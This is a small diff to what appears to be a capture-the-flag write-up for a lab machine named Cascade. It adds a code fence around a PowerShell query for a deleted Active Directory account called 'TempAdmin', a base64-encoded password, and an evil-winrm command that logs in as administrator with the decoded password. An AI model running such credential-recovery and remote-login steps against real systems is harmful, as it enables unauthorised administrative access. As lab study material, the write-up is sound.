@@ -211,8 +211,10 @@ Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
 
 add a filter for user
 
+```
 Get-ADObject -filter { SAMAccountName -eq "TempAdmin"} -includeDeletedObjects -Properties *
 
 YmFDVDNyMWFOMDBkbGVz
 
 evil-winrm -i cascade.local -u administrator -p baCT3r1aN00dles
+```
